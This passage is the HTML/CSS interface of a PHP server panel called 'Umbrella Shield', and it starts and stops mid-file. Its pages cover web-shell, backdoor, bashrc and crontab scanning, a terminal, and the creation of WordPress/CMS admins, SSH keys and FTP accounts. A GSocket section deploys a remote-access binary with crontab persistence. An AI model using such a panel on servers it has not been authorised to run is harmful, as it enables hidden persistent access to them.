
        .trm-i input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--green);
            padding: 10px;
            font-family: monospace;
            font-size: 13px;
            outline: none
        }

        .ir {
            display: flex;
            padding: 6px 0;
            border-bottom: 1px solid var(--border)
        }

        .ir:last-child {
            border: none
        }

        .ir .il {
            width: 140px;
            color: var(--t3);
            font-size: 12px;
            flex-shrink: 0
        }

        .ir .iv {
            color: var(--orange);
            font-size: 12px;
            font-family: monospace;
            word-break: break-all
        }

        .ld {
            color: var(--t3);
            padding: 20px;
            text-align: center
        }

        .hid {
            display: none
        }

        .fi {
            animation: fi .3s ease
        }

        @keyframes fi {
            from {
                opacity: 0;
                transform: translateY(6px)
            }

            to {
                opacity: 1;
                transform: none
            }
        }

        @keyframes pu {

            0%,
            100% {
                opacity: 1
            }

            50% {
                opacity: .3
            }
        }

        .pu {
            animation: pu 1.5s ease infinite
        }

        input[type=text] {
            background: var(--bg0);
            border: 1px solid var(--border);
            border-radius: var(--rs);
            color: var(--t1);
            padding: 8px 12px;
            font-size: 13px;
            outline: none;
            font-family: inherit
        }

        input[type=text]:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--adim)
        }
    </style>
</head>

<body>
    <div class="app">
        <div class="sb">
            <div class="sb-h">
                <div class="logo">&#9763;</div>
                <div class="nm">SHIELD</div>
                <div class="ver">Umbrella Defense v1.0</div>
            </div>
            <div class="sb-n">
                <button class="ni active" data-p="dashboard"><span class="ic">&#9632;</span> Dashboard</button>
                <button class="ni" data-p="processes"><span class="ic">&#9881;</span> Processes <span class="badge hid"
                        id="pb">0</span></button>
                <button class="ni" data-p="scanner"><span class="ic">&#128270;</span> Shell Scanner</button>
                <button class="ni" data-p="backdoors"><span class="ic">&#128274;</span> Backdoor Files</button>
                <button class="ni" data-p="bashrc"><span class="ic">&#128203;</span> Bashrc Guard</button>
                <button class="ni" data-p="crontab"><span class="ic">&#9201;</span> Crontab Guard <span
                        class="badge hid" id="crb">0</span></button>
                <button class="ni" data-p="wpusers"><span class="ic">&#128100;</span> WP Users</button>
                <button class="ni" data-p="cmsusers"><span class="ic">&#127758;</span> CMS Users</button>
                <button class="ni" data-p="ssh"><span class="ic">&#128273;</span> SSH Keys</button>
                <button class="ni" data-p="cpanel"><span class="ic">&#128451;</span> cPanel FTP</button>
                <button class="ni" data-p="gsocket"><span class="ic">&#128279;</span> GSocket Lock</button>
                <button class="ni" data-p="terminal"><span class="ic">&#62208;</span> Terminal</button>
                <button class="ni" data-p="info"><span class="ic">&#9432;</span> Server Info</button>
            </div>
            <div class="sb-f">By Umbrella</div>
        </div>
        <div class="mn">
            <div class="tb">
                <div class="dots">
                    <div class="dot dr"></div>
                    <div class="dot dy"></div>
                    <div class="dot dg"></div>
                </div>
                <div class="tb-t">UMBRELLA SHIELD &mdash;
                    <?= htmlspecialchars(gethostname()) ?> &mdash;
                    <?= htmlspecialchars($user) ?>
                </div>
                <div style="display:flex;gap:6px;align-items:center"><span
                        style="width:8px;height:8px;border-radius:50%;background:var(--green);display:inline-block"></span><span
                        style="color:var(--t3);font-size:11px">ONLINE</span></div>
            </div>
            <div class="ct">

                <!-- DASHBOARD -->
                <div id="p-dashboard" class="pg fi">
                    <div class="sg" id="ds">
                        <div class="sc">
                            <div class="v" id="dv-p">-</div>
                            <div class="l">Processes</div>
                        </div>
                        <div class="sc">
                            <div class="v" id="dv-t">-</div>
                            <div class="l">Threats</div>
                        </div>
                        <div class="sc">
                            <div class="v" id="dv-s">-</div>
                            <div class="l">Web Shells</div>
                        </div>
                        <div class="sc">
                            <div class="v" id="dv-b">-</div>
                            <div class="l">Bashrc</div>
                        </div>
                        <div class="sc">
                            <div class="v" id="dv-g">-</div>
                            <div class="l">Guardian</div>
                        </div>
                    </div>
                    <div class="pn" style="margin-top:16px">
                        <div class="pn-h">
                            <h3>&#9889; Quick Actions</h3>
                        </div>
                        <div class="pn-b" style="display:flex;gap:10px;flex-wrap:wrap">
                            <button class="btn btn-d"
                                onclick="if(confirm('PKILL ALL processes?'))api('pkill_all',{},function(){log('pkill -9 executed');scanAll()})">&#9760;
                                PKILL ALL</button>
                            <button class="btn btn-w" onclick="scanAll()">&#128270; Full Scan</button>
                            <button class="btn btn-g"
                                onclick="api('clean_bashrc',{},function(){log('.bashrc cleaned');sBashrc()})">&#128203;
                                Clean Bashrc</button>
                            <button class="btn btn-g" onclick="nav('terminal')">&#62208; Terminal</button>
                        </div>
                    </div>
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128220; Activity Log</h3>
                        </div>
                        <div class="pn-b">
                            <div id="alog"
                                style="font-family:monospace;font-size:11px;color:var(--t2);max-height:200px;overflow-y:auto">
                            </div>
                        </div>
                    </div>
                </div>

                <!-- PROCESSES -->
                <div id="p-processes" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#9881; Process Monitor</h3>
                            <div style="display:flex;gap:8px">
                                <button class="btn btn-s" onclick="sProcs()">&#128260; Refresh</button>
                                <button class="btn btn-s btn-d"
                                    onclick="if(confirm('PKILL ALL?'))api('pkill_all',{},function(){log('pkill all');sProcs()})">&#9760;
                                    PKILL ALL</button>
                            </div>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th>PID</th>
                                        <th>CPU</th>
                                        <th>MEM</th>
                                        <th>Command</th>
                                        <th>Status</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="pt">
                                    <tr>
                                        <td colspan=6 class="ld">Click Refresh</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- SCANNER -->
                <div id="p-scanner" class="pg hid">
                    <div class="pn">
                        <div class="pn-h" style="flex-direction:column;align-items:flex-start;gap:10px">
                            <div style="display:flex;align-items:center;justify-content:space-between;width:100%">
                                <h3 style="margin:0">&#128270; Web Shell Scanner</h3>
                                <button id="scan-btn" class="btn btn-s btn-w" onclick="sFiles()" disabled
                                    style="opacity:0.5">&#128270; Scan</button>
                            </div>
                            <div style="display:flex;align-items:center;gap:10px;width:100%;flex-wrap:wrap">
                                <div style="display:flex;flex-direction:column;gap:4px;flex:1;min-width:200px">
                                    <label
                                        style="font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:0.5px">&#128197;
                                        Target Domain <span style="color:var(--orange);font-weight:600">&#9889; pilih 1
                                            domain = lebih cepat</span></label>
                                    <select id="scan-domain-sel"
                                        style="background:var(--bg0);border:1px solid var(--orange);color:var(--t1);border-radius:6px;padding:6px 10px;font-size:12px;cursor:pointer;width:100%">
                                        <option value="">&#9203; Loading domains...</option>
                                    </select>
                                </div>
                                <div style="display:flex;flex-direction:column;gap:4px;flex:1;min-width:200px">
                                    <label
                                        style="font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:0.5px">&#128193;
                                        Custom Path <span style="color:var(--t3)">(optional, override
                                            domain)</span></label>
                                    <input id="scan-custom-path" type="text"
                                        placeholder="/home/user/domains/domain.com/public_html/wp-content"
                                        style="background:var(--bg0);border:1px solid var(--border);color:var(--t1);border-radius:6px;padding:6px 10px;font-size:12px;width:100%;box-sizing:border-box">
                                </div>
                            </div>
                            <div id="scan-hint"
                                style="font-size:11px;color:var(--t3);padding:6px 10px;background:var(--bg0);border-radius:6px;border:1px solid var(--border);width:100%;box-sizing:border-box">
                                &#9203; Memuat daftar domain...
                            </div>
                        </div>
                        <div id="scan-filter-bar"
                            style="display:none;padding:8px 16px;background:var(--bg3);border-bottom:1px solid var(--border);display:none;align-items:center;gap:10px;flex-wrap:wrap">
                            <label
                                style="font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:0.5px">&#128270;
                                Filter Signature:</label>
                            <select id="scan-sig-filter" onchange="filterScanResults()"
                                style="background:var(--bg0);border:1px solid var(--orange);color:var(--t1);border-radius:6px;padding:5px 10px;font-size:11px;min-width:200px;cursor:pointer">
                                <option value="">All Signatures</option>
                            </select>
                            <span id="scan-filter-count" style="font-size:11px;color:var(--t3)"></span>
                            <button onclick="toggleWhitelist()" class="btn btn-s" style="margin-left:auto;background:#555;color:#fff;font-size:10px;padding:4px 10px">Manage WL</button>
                        </div>
                        <div id="hidden-sigs-bar" style="display:none;padding:6px 16px;background:#1a1a1a;border-bottom:1px solid var(--border);align-items:center;gap:6px;flex-wrap:wrap">
                        </div>
                        <div id="wl-panel" style="display:none;padding:10px 16px;background:var(--bg0);border-bottom:1px solid var(--border)">
                            <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
                                <span style="font-size:12px;font-weight:600;color:var(--t1)">Whitelist Entries</span>
                                <span id="wl-count" style="font-size:11px;color:var(--t3)"></span>
                            </div>
                            <div id="wl-list" style="max-height:200px;overflow-y:auto"></div>
                            <div style="margin-top:8px;font-size:10px;color:var(--t3)">Whitelisted signatures/paths won't appear in scan results. Re-scan after changes.</div>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Domain</th>
                                        <th>Signature</th>
                                        <th>Filename</th>
                                        <th>Full Path</th>
                                        <th style="cursor:pointer" onclick="sortScanResults('size')" title="Click to sort">Size ↕</th>
                                        <th style="cursor:pointer" onclick="sortScanResults('mod')" title="Click to sort">Modified ↕</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="st">
                                    <tr>
                                        <td colspan=7 class="ld">Click Scan</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- BACKDOORS -->
                <div id="p-backdoors" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128274; Backdoor Files</h3><button class="btn btn-s" onclick="sBd()">&#128260;
                                Scan</button>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <div style="padding:10px 12px;color:var(--t3);font-size:11px">Checks: .config/htop,
                                .config/Thunar, .config/gs, .config/.cache</div>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Path</th>
                                        <th>Type</th>
                                        <th>Size</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="bt">
                                    <tr>
                                        <td colspan=4 class="ld">Click Scan</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                <!-- BASHRC -->
                <div id="p-bashrc" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128203; Bashrc Guard</h3>
                            <div style="display:flex;gap:8px;flex-wrap:wrap">
                                <button class="btn btn-s" onclick="sBashrc()">&#128260; Check</button>
                                <button class="btn btn-s btn-d"
                                    onclick="if(confirm('Clean all profile files?'))api('clean_bashrc',{},function(){log('.bashrc cleaned');sBashrc()})">&#128165;
                                    Clean</button>
                                <button id="btn-lock-bashrc" class="btn btn-s" style="background:#1c4532;color:#34d399;border:1px solid #34d399"
                                    onclick="api('lock_bashrc',{},function(d){log(d.ok?'&#128274; Locked: '+d.message:'&#9888; '+d.error);sBashrc()})">&#128274; Lock</button>
                                <button id="btn-unlock-bashrc" class="btn btn-s btn-g"
                                    onclick="api('unlock_bashrc',{},function(d){log(d.ok?'&#128275; Unlocked: '+d.message:'&#9888; '+d.error);sBashrc()})">&#128275; Unlock</button>
                                <button class="btn btn-s" style="background:var(--orange);color:#000" onclick="editBashrc('.bashrc')">&#9998; .bashrc</button>
                                <button class="btn btn-s" style="background:#555;color:#ccc" onclick="editBashrc('.profile')">&#9998; .profile</button>
                                <button class="btn btn-s" style="background:#555;color:#ccc" onclick="editBashrc('.bash_profile')">&#9998; .bash_profile</button>
                                <button class="btn btn-s" style="background:#555;color:#ccc" onclick="editBashrc('.bash_login')">&#9998; .bash_login</button>
                            </div>
                        </div>
                        <div class="pn-b">
                            <div id="bst"></div>
                            <div class="trm" style="margin-top:12px">
                                <div class="trm-h">
                                    <div class="dot dr" style="width:8px;height:8px"></div>
                                    <div class="dot dy" style="width:8px;height:8px"></div>
                                    <div class="dot dg" style="width:8px;height:8px"></div><span
                                        style="flex:1;text-align:center;color:var(--t3);font-size:11px">.bashrc</span>
                                </div>
                                <div class="trm-b" id="brc">Click Check</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- CRONTAB GUARD -->
                <div id="p-crontab" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#9201; Crontab Guard</h3>
                            <div style="display:flex;gap:8px">
                                <button class="btn btn-s" onclick="sCron()">&#128260; Check</button>
                                <button class="btn btn-s btn-d" id="btn-clean-cron" style="display:none"
                                    onclick="if(confirm('Remove all malicious crontab entries?'))cleanCron()">&#128465;
                                    Clean Crontab</button>
                            </div>
                        </div>
                        <div class="pn-b">
                            <div id="cron-caps" style="margin-bottom:10px"></div>
                            <div id="cron-status" style="margin-bottom:12px"></div>
                            <div class="trm">
                                <div class="trm-h">
                                    <div class="dot dr" style="width:8px;height:8px"></div>
                                    <div class="dot dy" style="width:8px;height:8px"></div>
                                    <div class="dot dg" style="width:8px;height:8px"></div>
                                    <span style="flex:1;text-align:center;color:var(--t3);font-size:11px">crontab
                                        -l</span>
                                </div>
                                <div class="trm-b" id="cron-raw" style="white-space:pre-wrap">Click Check</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- WP USERS -->
                <div id="p-wpusers" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128100; WP Users</h3><button class="btn btn-s" onclick="wpLoadUsers(1)">&#128260;
                                Scan</button>
                        </div>
                        <div id="wp-stats"
                            style="padding:12px;display:flex;gap:16px;flex-wrap:wrap;font-size:12px;color:var(--t3)">
                        </div>
                        <div id="wp-threats" style="padding:0 12px"></div>
                        <div
                            style="padding:8px 12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--b2)">
                            <select id="wp-role"
                                style="background:var(--bg0);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px"
                                onchange="wpLoadUsers(1)">
                                <option value="administrator">Administrator</option>
                                <option value="editor">Editor</option>
                                <option value="subscriber">Subscriber</option>
                                <option value="customer">Customer</option>
                                <option value="all">All Roles</option>
                            </select>
                            <button class="btn btn-s btn-d" id="wp-del-sel" style="display:none"
                                onclick="wpDeleteSelected()">&#128465; Delete Selected</button>
                            <span id="wp-sel-count" style="font-size:11px;color:var(--accent);display:none">0
                                selected</span>
                            <div style="flex:1"></div>
                            <span id="wp-pager" style="font-size:11px;color:var(--t3)"></span>
                            <button class="btn btn-s" onclick="wpLoadUsers(wpPage-1)">&#9664;</button>
                            <button class="btn btn-s" onclick="wpLoadUsers(wpPage+1)">&#9654;</button>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th style="width:30px"><input type="checkbox" id="wp-selall"
                                                onchange="wpToggleAll(this)"></th>
                                        <th>ID</th>
                                        <th>Username</th>
                                        <th>Email</th>
                                        <th>Registered</th>
                                        <th>Roles</th>
                                        <th>AppPwd</th>
                                        <th>Flags</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="wp-tbody">
                                    <tr>
                                        <td colspan="9" class="ld">Click Scan</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <details style="margin-top:12px;padding:0 12px 12px">
                            <summary style="color:var(--t3);font-size:12px;cursor:pointer;padding:8px 0">&#10133; Add
                                User / Bulk Delete</summary>
                            <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:8px">
                                <div
                                    style="flex:1;min-width:250px;background:var(--bg3);border:1px solid var(--b2);border-radius:8px;padding:12px">
                                    <div style="font-size:11px;color:var(--t3);margin-bottom:8px;font-weight:600">
                                        &#10133; Add Admin User</div>
                                    <input type="text" id="wp-new-user" placeholder="Username"
                                        style="width:100%;margin-bottom:6px">
                                    <input type="text" id="wp-new-email" placeholder="Email"
                                        style="width:100%;margin-bottom:6px">
                                    <input type="text" id="wp-new-pass" placeholder="Password"
                                        style="width:100%;margin-bottom:6px">
                                    <button class="btn btn-s btn-ok" onclick="wpAddUser()">Add Admin</button>
                                </div>
                                <div
                                    style="flex:1;min-width:250px;background:var(--bg3);border:1px solid var(--b2);border-radius:8px;padding:12px">
                                    <div style="font-size:11px;color:var(--t3);margin-bottom:8px;font-weight:600">
                                        &#128465; Bulk Delete by Pattern</div>
                                    <input type="text" id="wp-bulk-pat" placeholder="e.g. wp4w1qj7"
                                        style="width:100%;margin-bottom:6px">
                                    <select id="wp-bulk-field"
                                        style="background:var(--bg0);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px;margin-bottom:6px;width:100%">
                                        <option value="user_login">By Username</option>
                                        <option value="user_email">By Email</option>
                                    </select>
                                    <button class="btn btn-s btn-w" onclick="wpBulkPreview()">Preview Count</button>
                                    <button class="btn btn-s btn-d" onclick="wpBulkDelete()">Delete All
                                        Matching</button>
                                    <div id="wp-bulk-result" style="font-size:11px;color:var(--t3);margin-top:6px">
                                    </div>
                                </div>
                            </div>
                        </details>
                    </div>
                </div>

                <!-- CMS USERS -->
                <div id="p-cmsusers" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#127758; CMS Users</h3>
                            <button class="btn btn-s" onclick="cmsDetect()">&#128270; Detect CMS</button>
                        </div>
                        <div id="cms-detect-bar" style="padding:10px 12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--b2)">
                            <span id="cms-detect-status" style="font-size:12px;color:var(--t3)">Click "Detect CMS" to find installed sites</span>
                            <select id="cms-instance-sel" style="display:none;background:var(--bg0);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:12px;max-width:280px" onchange="cmsOnInstanceChange()"></select>
                            <span id="cms-type-badge" style="display:none;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;background:rgba(99,102,241,0.2);color:#818cf8"></span>
                        </div>
                        <div style="padding:6px 12px;display:flex;gap:6px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--b2);background:var(--bg0)">
                            <span style="font-size:10px;color:var(--t3)">Manual:</span>
                            <input id="cms-manual-path" placeholder="/home/user/domains/site.com/public_html" style="flex:1;min-width:200px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px;font-family:monospace">
                            <select id="cms-manual-type" style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px">
                                <option value="auto">Auto-detect</option>
                                <option value="wordpress">WordPress</option>
                                <option value="joomla">Joomla</option>
                                <option value="laravel">Laravel</option>
                                <option value="opencart">OpenCart</option>
                                <option value="drupal">Drupal</option>
                                <option value="prestashop">PrestaShop</option>
                            </select>
                            <button class="btn btn-s btn-ok" style="font-size:10px;padding:4px 10px" onclick="cmsManualLoad()">Load</button>
                            <span id="cms-manual-err" style="font-size:10px;color:var(--accent);display:none"></span>
                        </div>
                        <div id="cms-filterbar" style="display:none;padding:8px 12px;gap:8px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--b2)">
                            <select id="cms-role" style="background:var(--bg0);border:1px solid var(--border);border-radius:6px;color:var(--t1);padding:4px 8px;font-size:11px" onchange="cmsLoadUsers(1)">
                                <option value="administrator">Administrator</option>
                                <option value="editor">Editor</option>
                                <option value="subscriber">Subscriber</option>
                                <option value="customer">Customer</option>
                                <option value="all">All Roles</option>
                            </select>
                            <button class="btn btn-s" onclick="cmsLoadUsers(1)">&#128260; Refresh</button>
                            <button class="btn btn-s btn-d" id="cms-del-sel" style="display:none" onclick="cmsDeleteSelected()">&#128465; Delete Selected</button>
                            <span id="cms-sel-count" style="font-size:11px;color:var(--accent);display:none">0 selected</span>
                            <div style="flex:1"></div>
                            <span id="cms-pager" style="font-size:11px;color:var(--t3)"></span>
                            <button class="btn btn-s" onclick="cmsLoadUsers(cmsPage-1)">&#9664;</button>
                            <button class="btn btn-s" onclick="cmsLoadUsers(cmsPage+1)">&#9654;</button>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <div id="cms-info" style="padding:20px;text-align:center;color:var(--t3);font-size:12px">Select a CMS instance to view users</div>
                            <table id="cms-table" style="display:none">
                                <thead>
                                    <tr>
                                        <th style="width:30px"><input type="checkbox" id="cms-selall" onchange="cmsToggleAll(this)"></th>
                                        <th>ID</th>
                                        <th>Username</th>
                                        <th>Email</th>
                                        <th>Created</th>
                                        <th>Roles / Groups</th>
                                        <th>Flags</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="cms-tbody"></tbody>
                            </table>
                        </div>
                        <!-- Add User + Bulk Delete -->
                        <details id="cms-addform" style="display:none;margin-top:12px;padding:0 12px 12px">
                            <summary style="color:var(--t3);font-size:12px;cursor:pointer;padding:8px 0">&#10133; Add Admin User</summary>
                            <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:8px">
                                <div style="flex:1;min-width:260px;background:var(--bg3);border:1px solid var(--b2);border-radius:8px;padding:12px">
                                    <div style="font-size:11px;color:var(--t3);margin-bottom:8px;font-weight:600">&#10133; Add Admin / Super User</div>
                                    <input type="text" id="cms-new-user" placeholder="Username" style="width:100%;margin-bottom:6px">
                                    <input type="text" id="cms-new-email" placeholder="Email" style="width:100%;margin-bottom:6px">
                                    <input type="text" id="cms-new-pass" placeholder="Password" style="width:100%;margin-bottom:6px">
                                    <button class="btn btn-s btn-ok" onclick="cmsAddUser()">Add User</button>
                                    <div id="cms-add-result" style="font-size:11px;color:var(--t3);margin-top:6px"></div>
                                </div>
                            </div>
                        </details>
                    </div>
                </div>

                <!-- SSH KEYS -->
                <div id="p-ssh" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128273; SSH Keys</h3><button class="btn btn-s" onclick="sshScan()">&#128260;
                                Scan</button>
                        </div>
                        <div id="ssh-status" style="padding:12px;color:var(--t3);font-size:12px">Click Scan to check SSH
                            keys</div>
                        <div id="ssh-elf-warn" style="padding:0 12px"></div>
                        <div id="ssh-files" style="padding:0 12px"></div>
                        <div id="ssh-keys" style="padding:12px"></div>
                        <div style="padding:12px;border-top:1px solid var(--b2)">
                            <div style="font-size:11px;color:var(--t3);margin-bottom:6px;font-weight:600">Add SSH Key
                            </div>
                            <textarea id="ssh-newkey" placeholder="ssh-rsa AAAA... user@host"
                                style="width:100%;height:60px;background:var(--bg);border:1px solid var(--b2);border-radius:8px;color:var(--t1);padding:8px;font-size:11px;font-family:monospace;resize:vertical"></textarea>
                            <button class="btn btn-s" style="margin-top:6px" onclick="sshAdd()">Add Key</button>
                        </div>
                    </div>
                    <!-- SSH Edit Modal -->
                    <div id="ssh-edit-modal"
                        style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:999;display:none;align-items:center;justify-content:center">
                        <div
                            style="background:var(--bg1);border:1px solid var(--border);border-radius:12px;padding:20px;width:90%;max-width:700px">
                            <div style="display:flex;justify-content:space-between;margin-bottom:12px">
                                <h3 style="color:var(--t1)">Edit SSH Key</h3>
                                <button class="btn btn-s" onclick="sshEditClose()">&#10005; Close</button>
                            </div>
                            <div id="ssh-edit-info" style="font-size:11px;color:var(--t3);margin-bottom:8px"></div>
                            <textarea id="ssh-edit-val"
                                style="width:100%;height:120px;background:var(--bg0);border:1px solid var(--border);border-radius:8px;color:var(--t1);padding:10px;font-size:11px;font-family:monospace;resize:vertical"></textarea>
                            <div style="display:flex;gap:8px;margin-top:10px">
                                <button class="btn btn-s btn-ok" onclick="sshEditSave()">Save</button>
                                <button class="btn btn-s" onclick="sshEditClose()">Cancel</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- CPANEL FTP -->
                <div id="p-cpanel" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128451; cPanel Accounts</h3><button class="btn btn-s" onclick="cpLoad()">&#128260;
                                Scan</button>
                        </div>
                        <div id="cp-status" style="padding:12px;font-size:12px;color:var(--t3)">Click Scan to load
                            cPanel accounts</div>
                        <div id="cp-creds"
                            style="padding:0 12px 12px;display:none;gap:8px;align-items:end;flex-wrap:wrap;background:rgba(255,159,10,0.05);border:1px solid rgba(255,159,10,0.2);border-radius:8px;margin:0 12px 12px;padding:12px">
                            <div
                                style="font-size:11px;color:var(--orange);font-weight:600;width:100%;margin-bottom:4px">
                                &#9888; UAPI CLI tidak tersedia — masukkan API Token untuk akses via curl</div>
                            <div>
                                <div style="font-size:10px;color:var(--t3);margin-bottom:2px">cPanel Username</div>
                                <input type="text" id="cp-user" placeholder="<?= htmlspecialchars($user) ?>"
                                    value="<?= htmlspecialchars($user) ?>" style="width:140px">
                            </div>
                            <div>
                                <div style="font-size:10px;color:var(--t3);margin-bottom:2px">API Token</div><input
                                    type="text" id="cp-token" placeholder="cPanel API token" style="width:280px">
                            </div>
                            <div style="font-size:10px;color:var(--t3);line-height:1.3;max-width:250px">cPanel &rarr;
                                Security &rarr; Manage API Tokens &rarr; Create</div>
                        </div>

                        <!-- FTP ACCOUNTS -->
                        <div style="padding:0 12px 8px">
                            <div style="font-size:12px;color:var(--t3);font-weight:600;margin-bottom:6px">&#128193; FTP
                                Accounts</div>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Username</th>
                                        <th>Login</th>
                                        <th>Home Dir</th>
                                        <th>Disk</th>
                                        <th>Quota</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="cp-ftp-tbody">
                                    <tr>
                                        <td colspan="6" class="ld">Click Scan</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <!-- EMAIL ACCOUNTS -->
                        <div style="padding:12px 12px 8px">
                            <div style="font-size:12px;color:var(--t3);font-weight:600;margin-bottom:6px">&#128231;
                                Email Accounts</div>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Email</th>
                                        <th>Domain</th>
                                        <th>Disk Used</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="cp-email-tbody">
                                    <tr>
                                        <td colspan="4" class="ld">Click Scan</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <!-- DB USERS -->
                        <div style="padding:12px 12px 8px">
                            <div style="font-size:12px;color:var(--t3);font-weight:600;margin-bottom:6px">&#128451;
                                MySQL Users</div>
                        </div>
                        <div id="cp-db-list" style="padding:0 12px 12px;font-size:11px;color:var(--t3)">Click Scan</div>

                        <!-- API TOKENS -->
                        <div style="padding:12px 12px 8px">
                            <div style="display:flex;justify-content:space-between;align-items:center">
                                <div style="font-size:12px;color:var(--t3);font-weight:600">&#128273; API Tokens</div>
                                <button class="btn btn-s" onclick="cpTokenList()" style="font-size:10px">&#128260;
                                    Load</button>
                            </div>
                            <div style="font-size:10px;color:var(--t3);margin-top:2px">Hacker bisa create API token
                                untuk persistent cPanel access</div>
                        </div>
                        <div class="pn-b" style="padding:0">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Name</th>
                                        <th>Created</th>
                                        <th>Access</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody id="cp-token-tbody">
                                    <tr>
                                        <td colspan="4" class="ld">Click Load (requires API Token above)</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <!-- ADD FTP -->
                        <details style="padding:0 12px 12px">
                            <summary style="color:var(--t3);font-size:12px;cursor:pointer;padding:8px 0">&#10133; Add
                                FTP Account</summary>
                            <div
                                style="background:var(--bg3);border:1px solid var(--b2);border-radius:8px;padding:12px;margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;align-items:end">
                                <div>
                                    <div style="font-size:10px;color:var(--t3);margin-bottom:2px">Username</div><input
                                        type="text" id="cp-ftp-user" placeholder="username" style="width:140px">
                                </div>
                                <div>
                                    <div style="font-size:10px;color:var(--t3);margin-bottom:2px">Password</div><input
                                        type="text" id="cp-ftp-pass" placeholder="password" style="width:140px">
                                </div>
                                <div>
                                    <div style="font-size:10px;color:var(--t3);margin-bottom:2px">Directory</div><input
                                        type="text" id="cp-ftp-dir" value="public_html" style="width:160px">
                                </div>
                                <div>
                                    <div style="font-size:10px;color:var(--t3);margin-bottom:2px">Quota (MB,
                                        0=unlimited)</div><input type="text" id="cp-ftp-quota" value="0"
                                        style="width:80px">
                                </div>
                                <button class="btn btn-s btn-ok" onclick="cpFtpAdd()">Add FTP</button>
                            </div>
                        </details>
                    </div>
                </div>

                <!-- GSOCKET LOCK -->
                <div id="p-gsocket" class="pg hid">
                    <div class="pn">
                        <div class="pn-h">
                            <h3>&#128279; GSocket</h3>
                            <div style="display:flex;gap:6px;align-items:center">
                                <div id="lock-badge" style="font-size:11px;padding:3px 10px;border-radius:4px;background:var(--bg3);color:var(--t3)">&#8855; Off</div>
                                <button class="btn btn-s" onclick="sGs()">&#128260; Status</button>
                            </div>
                        </div>
                        <div class="pn-b">
                            <div id="gs-status" style="margin-bottom:12px"></div>
                            <div id="gs-connect" style="margin-bottom:12px;display:none"></div>

                            <!-- DEPLOY & LOCK — satu section, semua opsi di sini -->
                            <div class="pn" style="margin:0;border-left:3px solid var(--green)">
                                <div class="pn-h" style="padding-bottom:8px">
                                    <h3>&#9889; Deploy &amp; Lock</h3>
                                    <span style="font-size:11px;color:var(--t3)">Download binary + start + crontab + WP cron</span>
                                </div>
                                <div class="pn-b">
                                    <div style="display:grid;grid-template-columns:1fr auto;gap:8px;margin-bottom:10px;align-items:end">
                                        <div>
                                            <div style="color:var(--t3);font-size:10px;margin-bottom:4px">Secret Key <span style="color:var(--t3);font-style:italic">(kosongkan = auto-generate)</span></div>
                                            <input type="text" id="gs-lock-secret" placeholder="Auto-generate jika kosong" style="width:100%;box-sizing:border-box;font-family:monospace;font-size:12px">
                                        </div>
                                        <div>
